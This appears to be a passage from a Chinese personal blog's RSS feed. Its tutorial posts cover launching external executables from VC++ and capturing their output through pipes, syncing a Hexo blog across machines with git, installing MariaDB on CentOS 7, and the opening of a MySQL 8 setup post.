&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/python/">Python</category></item><item><title>VC++调用外部exe并获取程序运行输出</title><link>https://yuukisama.cc/posts/code/vc-%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8exe%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E8%BE%93%E5%87%BA/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/vc-%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8exe%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E8%BE%93%E5%87%BA/</guid><pubDate>Thu, 17 Jan 2019 12:16:36 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;blockquote>
&lt;h2 id="摘要">摘要&lt;/h2>
&lt;/blockquote>
&lt;ul>
&lt;li>
&lt;p>最近在采坑某个项目，需要用到调用外部写好的exe运行，项目基于c语言，于是就有了关于&lt;strong>VC++调用外部程序并获取程序命令行运行输出的问题&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>本文将围绕windows下调用外部exe程序的常见的几种方法展开。部分方法可能也适用于linux平台。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;del>虽然到最后我的项目也没能具体应用上这项技术&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>本文将会涉及到的主要函数:&lt;/p>
&lt;ul>
&lt;li>system()&lt;/li>
&lt;li>winexec()&lt;/li>
&lt;li>ShellExecute()&lt;/li>
&lt;li>CreateProcess()&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="lobei.jpg" alt="萝卜啊！赐予我力量！">&lt;/p>
&lt;h2 id="综述">综述&lt;/h2>
&lt;p>在调用外部exe程序的同时还想要获得程序运行过程中的输出内容。本文介绍的主要是使用管道的方法。不涉及内存共享等一类的方法。&lt;/p>
&lt;p>本文中假定所有的父程序即parent.exe；子程序为child.exe&lt;/p>
&lt;ul>
&lt;li>子程序源码
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
using namespace std;
int main(int argc, char* arg[]){
int x=argc;
cout&amp;lt;&amp;lt;x&amp;lt;&amp;lt;endl;
for(int i=0;i&amp;lt;x;i++)
cout&amp;lt;&amp;lt;arg[i]&amp;lt;&amp;lt;endl;
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="system">System()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>这是c/c++的标准函数之一，可以执行命令行命令。也可以在linux下调用。&lt;a href="http://www.cplusplus.com/reference/cstdlib/system/">详情文档参见cplusplus&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>int system(const char* command)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>调用命令处理器执行命令，win下可以理解为调用cmd.exe。如果执行的命令参数为空，该函数会检测命令处理器是否可用。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>返回值：&lt;/p>
&lt;p>如果命令参数为空，如果命令处理器可用该函数返回一个非零值。反之返回0&lt;/p>
&lt;p>如果命令参数不为空，返回值取决于你所执行的命令。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序并获得其回显&lt;/p>
&lt;p>这里使用的是默认的命令行将所有的命令执行的输出结果重定向到result.txt中，之后我们只需要使用文件操作读取result.txt中的内容即可。&lt;/p>
&lt;p>&lt;strong>坑：&lt;/strong> 命令行重定向输出到文件采用的是末尾追加的打开方式，为了保证程序每次执行结果不受上次执行结果的干扰，建议每次在读取完result.txt中的内容之后将文件清空。&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;cstdlib&amp;gt;
#include&amp;lt;fstream&amp;gt;
using namespace std;
int main(){
char buffer[4096]={0}; //用于文件读取
system(&amp;#34;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;.\\result.txt&amp;#34;);//执行子程序并传入参数
fstream file(&amp;#34;.\\result.txt&amp;#34;); //读取结果文件
while(file.is_open() &amp;amp;&amp;amp; !file.eof()){
file.read(buffer,4096);
cout&amp;lt;&amp;lt;buffer&amp;lt;&amp;lt;endl;
}
file.clear(); //清空文件内容方便下次读取
file.close(); //关闭文件
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>父程序输出样例&lt;/p>
&lt;pre tabindex="0">&lt;code>4
.\child.exe
argv1
argv2
gv3
&lt;/code>&lt;/pre>&lt;p>参数0为程序本身，参数1为传入的参数
&lt;strong>坑：&lt;/strong> 为森魔丢了argv3的ar？？？我也不知道，大佬了解的可以解答一下。result.txt里是全的，读取文件出了问题？？？&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="winexec">WinExec()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Windows API 函数&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-winexec">（个人建议微软爸爸的函数还是看微软爸爸的文档最合适）&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型：&lt;/p>
&lt;pre tabindex="0">&lt;code>UINT WinExec(
LPCSTR lpCmdLine, //你所要执行的命令
UINT uCmdShow //显示模式，设置不同的参数可以实现控制台隐藏等等
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：如果函数成功，则返回值大于31。 如果函数失败，则返回值会表示错误类型，详情参见文档&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序并获得其回显&lt;/p>
&lt;p>总的来说这个命令和system类似，只是多了一个显示模式的参数，可以做到隐藏控制台等等一系列的操作（具体参见微软文档）获取回显的方式依然是使用输出重定向到文本文件并读取的方式。注意点同上，因为使用的是文末追加的方式，最好每次读取完之后清空输出的文本内容。&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt; //WinExec函数头文件
#include&amp;lt;fstream&amp;gt;
using namespace std;
int main(){
char buffer[4096];
WinExec(&amp;#34;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;result.txt&amp;#34;,SW_SHOW);
fstream file(&amp;#34;.\\result.txt&amp;#34;);
while (file.is_open() &amp;amp;&amp;amp; !file.eof()){
file.read(buffer,4096);
cout&amp;lt;&amp;lt;buffer&amp;lt;&amp;lt;endl;
}
file.clear(); //清空输出文件内容
file.close();
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>父程序输出样例&lt;/p>
&lt;pre tabindex="0">&lt;code>5
.\child.exe
argv1
argv2
argv3
&amp;gt;&amp;gt;result.txt
&lt;/code>&lt;/pre>&lt;p>可以看得出来system()和WinExec()的差别，WinExec()会把最后重定向输出到文本文件也作为一个参数。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="shellexecute">ShellExecute()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Window API函数，&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea">详情文档参见微软官方文档&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>HINSTANCE ShellExecuteA(
HWND hwnd, //程序的窗口句柄，可以使用GetDesktopWindow()函数获取，也可以填写NULL
LPCSTR lpOperation, //你所要执行的操作，Shellexecute不光是可以运行外部程序那么简单，它还可以操作文件等等，具体取决于这个参数的设置
LPCSTR lpFile, //你所要操作的文件名称
LPCSTR lpParameters,//操作传入的参数
LPCSTR lpDirectory, //你所要操作的文件所在的文件夹，可以理解为工作目录
INT nShowCmd //显示参数
);
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑：&lt;/strong> 你可以在lpFile参数中直接写全文件路径，这样的话文件的工作目录就会是父程序的工作目录。如果不屑写全的话可以在lpFile中写上文件名，lpDirectory中写明文件所在路径。这样的话启动的子程序的默认工作路径也得到了指定。&lt;/p>
&lt;ul>
&lt;li>返回值：
函数返回一个HINSTANCE(实质是一个无符号的整形)，大于32表明子程序调用成功，小于32则表明调用失败。微软官方文档有详情解释每个错误的返回值的含义。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序&lt;/p>
&lt;h3 id="但并不能获取回显">&lt;strong>但并不能获取回显！！！&lt;/strong>&lt;/h3>
&lt;p>网上某些论坛博客里有人用这个函数调用外部exe并使用将输出重定向到文本文件的方式获取输出的返回内容，但是本人实践并未成功。如有大佬知道原因欢迎指正！&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt; //WinExec函数头文件
using namespace std;
int main(){
HINSTANCE ret;
ret=ShellExecute(
GetDesktopWindow(), //获取窗口句柄
&amp;#34;open&amp;#34;, //指定操作
&amp;#34;child.exe&amp;#34;, //程序文件名称
&amp;#34;argv1 agr2 argv3&amp;#34;, //命令行参数
&amp;#34;.\\&amp;#34;, //程序所在目录
SW_HIDE //子程序显示模式
);
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="shellexecuteex">ShellExecuteEx()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Window API函数，&lt;a href="https://docs.microsoft.com/zh-cn/windows/desktop/api/shellapi/nf-shellapi-shellexecutew">详情文档&lt;/a>&lt;/p>
&lt;ul>
&lt;li>这个函数是ShellExecute的扩展函数&lt;/li>
&lt;li>可以实现阻塞调用子程序&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>BOOL ShellExecuteExW(
SHELLEXECUTEINFOW *pExecInfo //指向SHELLEXECUTEINFO结构体的指针，该结构体中包含你所要调用的程序的相关信息
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：显而易见，True表示执行成功，反之，失败.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序示例&lt;/p>
&lt;p>&lt;strong>同样不可以使用重定向输出到文件的方式获取程序执行输出&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt; //shellapi.h你也可以使用这个头文件，shellapi.h包含在windows.h这个头文件内。
using namespace std;
int main(){
SHELLEEXECUTEINFO shellinfo;
ZeroMemory(&amp;amp;shellinfo,sizeof(SHELLEXECUTEINFO)); //初始化结构体数据
shellinfo.cbSize=sizeof(SHELLEXECUTEINFO); //cbSzie存储结构体大小
shellinfo.fMask=SEEK_MASK_NOCLOSEPROCESS; //标志表明其他结构成员的内容和有效性,SEEK_MASK_NOCLOSEPRCESS指明使用hProcess接收进程句柄
shellinfo.hwnd=GetDesktopWindow(); //获取窗口句柄
shellinfo.lpVerb=&amp;#34;open&amp;#34;; //指定操作类型，同上面的lpOperation
shellinfo.lpFile=&amp;#34;child.exe&amp;#34;; //指定文件名
shellinfo.lpParameters=&amp;#34;agrv1 argv2 argv3&amp;#34;; //传入子程序的参数
shellinfo.lpDirectory=&amp;#34;.\\&amp;#34;; //子程序工作目录
shellinfo.nShow=SW_HIDE; //子程序窗体显示，SW_HIDE隐藏
shellinfo.hInstApp=NULL; //如果SEEK_MASK_NOCLOSEPROCESS参数被设置，该参数用于接收返回子程序的执行情况，类似ShellExecute函数的返回值
BOOL ret=ShellExecuteEx(&amp;amp;shellinfo);
WaitForSingleObject(shellinfo.hProcess,INFINITE); //阻塞等待子进程执行完毕
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="createpipe--createprocess">CreatePipe() &amp;amp;&amp;amp; CreateProcess()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Window API函数，理论上调用外部exe并且获得其执行输出的最佳方案，但是函数很复杂，参数众多。&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa">依旧是微软爸爸的文档&lt;/a>&lt;/p>
&lt;p>&lt;del>并且本人的项目中致死都没有成功使用这个函数，个人认为是因为项目使用的SDK在多线程支持方面存在问题？？？&lt;/del>&lt;/p>
&lt;p>&lt;strong>本文重头戏，使用函数CreatePipe创建匿名管道将子程序输出重定向。（这里仅仅重定向输出，微软官方样例是输入输出都重定向了）&lt;/strong>&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/procthread/creating-a-child-process-with-redirected-input-and-output">微软官方样例&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>BOOL WINAPI CreatePipe(
_Out_ PHANDLE hReadPipe, //接收管道读取句柄的变量指针
_Out_ PHANDLE hWritePipe, //接收管道写句柄的变量指正
_In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes, //指向SECURITY_ATTRIBUTES结构体的指针，该结构确定子进程是否可以继承返回的句柄。如果lpPipeAttributes为NULL，则无法继承句柄。
_In_ DWORD nSize //管道缓冲区大小
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：如果函数成功，则返回值为非零。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>BOOL CreateProcessA(
LPCSTR lpApplicationName, //子程序的名称或者完整路径
LPSTR lpCommandLine, //子程序的完整路径加上命令行参数全部，如果你设置了上一个参数，这个参数只需要传入命令行参数即可。只有当上一个参数为空的时候你才需要填写子程序完整路径
LPSECURITY_ATTRIBUTES lpProcessAttributes, //子程序运行的子进程相关设置参数
LPSECURITY_ATTRIBUTES lpThreadAttributes, //子程序运行的子线程相关设置参数
BOOL bInheritHandles, //新进程是否继承父进程相关权限
DWORD dwCreationFlags, //子程序优先级相关是核定
LPVOID lpEnvironment, //指向新进程的环境块的指针。NULL，则新进程使用调用进程的环境。
LPCSTR lpCurrentDirectory, //当前进程的完整目录
LPSTARTUPINFOA lpStartupInfo, //子进程启动信息
LPPROCESS_INFORMATION lpProcessInformation //子进程信息
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：如果函数成功，则返回值为非零。&lt;/li>
&lt;/ul>
&lt;p>这是两个相当复杂的参数，其中包含多个结构体，每个结构体我们还需要单独讲解。接下来直接以源码搭配注释理解&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用匿名管道重定向外部exe输出示例：&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt;
using namespace std;
int main(){
HANDLE hRead,hWrite; //管道的读写句柄
SECURITY_ATTRIBUTES sa; //管道安全属性相关结构体
sa.nLength=sizeof(SECURITY_ATTRIBUTES); //结构体长度赋值
sa.lpSecurityDescriptor=NULL; //NULL管道默认安全描述符,管道的安全属性将继承与父程序
sa.bInheritHandle=TRUE; //一个布尔值，指定在创建新进程时是否继承返回的句柄。如果此成员为TRUE，则新进程将继承该句柄。
if(!CreatePipe(&amp;amp;hRead,&amp;amp;hWrite,&amp;amp;sa,0)){ //尝试创建管道，失败则弹出提示并退出
MessageBox(NULL,&amp;#34;Error on CreatePipe()&amp;#34;,&amp;#34;WARNING&amp;#34;,MB_OK);
return 1;
}
STARTUPINFO si; //启动信息结构体
PROCESS_INFORMATION pi; //进程信息结构体
si.cb=sizeof(STARTUPINFO); //初始化启动信息结构体大小
GetStartupInfo(&amp;amp;si); //获取父进程的启动信息，利用这个函数我们可以只需要修改较少的参数值
si.hStdError=hWrite; //重定向错误信息输出到管道
si.hStdOutput=hWrite; //重定向标准输出新信息到管道
si.wShowWindow=SW_HIDE; //设定子进程窗体是否隐藏
si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //wShowWindow成员将包含其他信息；hStdInput，hStdOutput和hStdError成员包含其他信息。
if (!CreateProcess(
&amp;#34;.//child.exe&amp;#34;, //子进程完整目录
&amp;#34;argv1 argv2 argv3&amp;#34;, //命令行参数
NULL,NULL,
TRUE, //新进程继承父进程相关权限
NULL,NULL,NULL,
&amp;amp;si, //启动信息结构体指针
&amp;amp;pi) //进程信息结构体指针
){
MessageBox(NULL,&amp;#34;Error on CreateProcess()&amp;#34;,&amp;#34;WARNING&amp;#34;,MB_OK);
return 1;
}
CloseHandle(hWrite); //关闭管道写入句柄
string result;
char buffer[4096]={0};
DWORD bytesRead;
while(1){ //读取管道内的数据
if (ReadFile(hRead,buffer,4095,&amp;amp;bytesRead,NULL)==NULL) break;
result+=buffer;
Sleep(200);
}
cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
retrun 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>程序运行结果&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>3
argv1
argv2
argv3
&lt;/code>&lt;/pre>&lt;p>emmm 很有意思啊，系统认定的传入参数数量越来越少咯~&lt;/p></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/c/c-/">C/C++</category></item><item><title>多终端更新hexo博客配置方法</title><link>https://yuukisama.cc/posts/code/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</guid><pubDate>Wed, 02 Jan 2019 17:27:22 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="概述">概述&lt;/h2>
&lt;ul>
&lt;li>本文的基础都建立在小站成长日记系列的基础上。本教程默认你参照小站成长日记系列之前的教程完成了相关配置&lt;/li>
&lt;li>博主本人电脑双系统，考虑到在不同设备终端更新博客的需求，于是有了下面这篇文章。&lt;/li>
&lt;li>&lt;strong>实现方法简述：&lt;/strong> 使用git创建新的分支用来存放hexo博客本身&lt;/li>
&lt;li>文末附kali下的小采坑&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="sample.jpg" alt="瞎几把找的图片可爱就完事了">&lt;/p>
&lt;hr>
&lt;h2 id="开始">开始&lt;/h2>
&lt;p>&lt;strong>坑：&lt;/strong> 如果你使用了三方主题，请把主题文件夹中的.git（可能为隐藏文件）文件夹删除。因为这个文件夹的存在会导致你后面推送的时候无法推送成功&lt;/p>
&lt;ol>
&lt;li>
&lt;p>在你的博客目录下运行命令,初始化&lt;/p>
&lt;pre tabindex="0">&lt;code>git init
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>添加远程仓库&lt;/p>
&lt;pre tabindex="0">&lt;code>//host 是你的远程仓库地址
git add remote origin git@host:blog.git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>新建分支并切换到新建的分支&lt;/p>
&lt;pre tabindex="0">&lt;code>git checkout -b 分支名
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来是git的基本操作，添加本地文件到git，以及提交&lt;/p>
&lt;pre tabindex="0">&lt;code>git add *
git commit -m &amp;#34;你的提交说明&amp;#34;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>将文件提交到你所创建的分支（这里我创建的分支名为hexo）&lt;/p>
&lt;pre tabindex="0">&lt;code>git push origin hexo
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="在你的git服务器上配置公钥">在你的git服务器上配置公钥&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>建议把准备长期使用的设备配置。（当然你不把新设备的公钥加入git服务器你也无法推送）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在你的新设备上生成秘钥&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;#34;your_email@email.com&amp;#34;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>将生成的公钥，即～/.ssh/id_rsa.pub文件的内容复制到git服务器的～/git/.ssh/authorized_keys文件中&lt;/p>
&lt;/li>
&lt;li>
&lt;p>秘钥配置可以参见本博客另一篇文章 {% post_link VPS-nginx-hexo搭建个人博客 点击查看 %}&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>到这里你已经完成了秘钥配置，尝试在新设备上拉取hexo分之吧。&lt;/p>
&lt;h2 id="嗯在新的设备上准备写博客">嗯，在新的设备上准备写博客&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先拉取hexo分支到本地&lt;/p>
&lt;pre tabindex="0">&lt;code>//host你的git仓库地址
git clone -b hexo git@host:blog.git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>进入到克隆下来的文件夹内，安装相应依赖&lt;/p>
&lt;pre tabindex="0">&lt;code>//进入文件夹
cd blog
//安装相应文件依赖
npm install
&lt;/code>&lt;/pre>&lt;p>&lt;strong>当然这里要保证你新的设别上具有git以及node.js框架&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>博客写完之后进行的操作&lt;/p>
&lt;pre tabindex="0">&lt;code>//博客的编译部署操作
hexo clean &amp;amp;&amp;amp; hexo g &amp;amp;&amp;amp; hexo d
//添加文件
git add *
//提交
git commit -m &amp;#34;你的提交说明&amp;#34;
//先拉取远程仓库的文件对比合并
git pull origin hexo
//解决版本冲突之后推送到hexo分支
git push origin hexo
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>在任意一台电脑上都别忘了拉取分支确保版本的一致性哦&lt;/p>
&lt;pre tabindex="0">&lt;code>git pull origin hexo
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="小插曲">小插曲&lt;/h2>
&lt;p>&lt;strong>坑&lt;/strong> 这里任意一台新设备也是需要安装好nodejs以及npm的。这里补充一个小插曲&lt;/p>
&lt;ul>
&lt;li>
&lt;p>博主电脑双系统是win+kali的组合&lt;/p>
&lt;/li>
&lt;li>
&lt;p>kali这个小奇葩自带nodejs的，在命令行直接输入node -v是由回显的。然而输入npm提示命令不存在&lt;/p>
&lt;/li>
&lt;li>
&lt;p>于是乎四处寻找有关修复这个bug的方法（其实也不算bug）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>网上多数教程linux下安装npm都是去nodejs官网下载安装。即使是直接面向kali的也是&lt;/p>
&lt;/li>
&lt;li>
&lt;p>但是其实apt的源中包含了npm，直接使用包管理安装即可&lt;/p>
&lt;pre tabindex="0">&lt;code>//确保系统最新
apt update &amp;amp;&amp;amp; apt upgrade -y &amp;amp;&amp;amp; reboot
//安装缺少的npm
apt install npm -y
&lt;/code>&lt;/pre>&lt;p>安装完成之后再尝试输入npm就有回显说明安装完成了。&lt;/p>
&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E5%BB%BA%E7%AB%99/">建站</category></item><item><title>Centos 7 yum安装Mariadb</title><link>https://yuukisama.cc/posts/code/centos-7-yum%E5%AE%89%E8%A3%85mariadb/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/centos-7-yum%E5%AE%89%E8%A3%85mariadb/</guid><pubDate>Sat, 29 Dec 2018 15:51:00 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>Centos7 下安装mariaDB数据库的操作记录。&lt;/li>
&lt;li>MariaDB数据库是mysql的衍生版。centos发行版在centos6之后就将默认数据库改为了mariadb。&lt;a href="https://www.zhihu.com/question/41832866">因为MySQL被甲骨文公司收购后存在闭源风险&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="Linux.jpg" alt="图片来源萌娘百科">&lt;/p>
&lt;ul>
&lt;li>这次安装的目的，也是处于小站之后的发展考虑。&lt;/li>
&lt;/ul>
&lt;h2 id="安装">安装&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>linux服务器，阿里云的ECS&lt;/p>
&lt;pre tabindex="0">&lt;code>[root@host /]# lsb_release -a
LSB Version: :core-4.1-amd64:core-4.1-noarch
Distributor ID: CentOS
Description: CentOS Linux release 7.6.1810 (Core)
Release: 7.6.1810
Codename: Core
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>使用阿里云linux服务器默认的yum源安装，因此也没什么折腾的，简单几条命令&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install mariadb mariadb-server -y
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="配置">配置&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>启动数据库&lt;/p>
&lt;pre tabindex="0">&lt;code>systemctl start mariadb
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>设置数据库开机自启&lt;/p>
&lt;pre tabindex="0">&lt;code>systemctl enable mariadb
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Mariadb数据库自带了初始化命令，使用命令之后以找操作进行即可。这里是使用的安全安装命令，安装过程中会提示设置密码等&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql_secure_installation
以下是log记录辅以注释
[root@host /]# mysql_secure_installation
NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB
SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY!
In order to log into MariaDB to secure it, we&amp;#39;ll need the current
password for the root user. If you&amp;#39;ve just installed MariaDB, and
you haven&amp;#39;t set the root password yet, the password will be blank,
so you should just press enter here.
# 输入数据库root用户名密码，初始默认为空
Enter current password for root (enter for none):
ERROR 1045 (28000): Access denied for user &amp;#39;root&amp;#39;@&amp;#39;localhost&amp;#39; (using password: YES)
Enter current password for root (enter for none):
OK, successfully used password, moving on...
Setting the root password ensures that nobody can log into the MariaDB
root user without the proper authorisation.
# 是否设置用户名密码？ 是
Set root password? [Y/n] Y
New password:
Re-enter new password:
Password updated successfully!
Reloading privilege tables..
... Success!
By default, a MariaDB installation has an anonymous user, allowing anyone
to log into MariaDB without having to have a user account created for
them. This is intended only for testing, and to make the installation
go a bit smoother. You should remove them before moving into a
production environment.
# 是否移除匿名用户？ 是
Remove anonymous users? [Y/n] Y
... Success!
Normally, root should only be allowed to connect from &amp;#39;localhost&amp;#39;. This
ensures that someone cannot guess at the root password from the network.
# 禁止root用户从远程登陆，仅允许本地登录 是
Disallow root login remotely? [Y/n] Y
... Success!
By default, MariaDB comes with a database named &amp;#39;test&amp;#39; that anyone can
access. This is also intended only for testing, and should be removed
before moving into a production environment.
# 移除测试用数据库 是
Remove test database and access to it? [Y/n] Y
- Dropping test database...
... Success!
- Removing privileges on test database...
... Success!
Reloading the privilege tables will ensure that all changes made so far
will take effect immediately.
# 重新加载权限列表 是
Reload privilege tables now? [Y/n] Y
... Success!
Cleaning up...
All done! If you&amp;#39;ve completed all of the above steps, your MariaDB
installation should now be secure.
Thanks for using MariaDB!
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>至此，mariadb数据库的安装基本完成。&lt;a href="https://jaminzhang.github.io/mysql/yum-install-MariaDB-in-CentOS7/">本文参考连接&lt;/a>&lt;/p>
&lt;p>使用如下命令登陆数据库。&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/linux/">Linux</category><category domain="https://yuukisama.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</category></item><item><title>mysql8的安装配置以及JDBC使用</title><link>https://yuukisama.cc/posts/code/mysql8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8Ajdbc%E4%BD%BF%E7%94%A8/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/mysql8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8Ajdbc%E4%BD%BF%E7%94%A8/</guid><pubDate>Fri, 28 Dec 2018 16:11:13 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>基于windows下mysql 8.0.*版本安装以及配置等操作介绍
&lt;ul>
&lt;li>基本安装&lt;/li>
&lt;li>初始化&lt;/li>
&lt;li>密码重置&lt;/li>
&lt;li>创建数据库&lt;/li>
&lt;li>创建列表&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>以及书本《Java简明教程》实列代码的采坑&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="Sqlserver.jpg" alt="">&lt;/p>
&lt;h2 id="安装">安装&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>从mysql官网下载mysql社区版本&lt;/p>
&lt;p>这里选择的时二进制安装文件，就是需要配置环境变量的那种&lt;a href="https://dev.mysql.com/downloads/mysql/">下载&lt;/a>
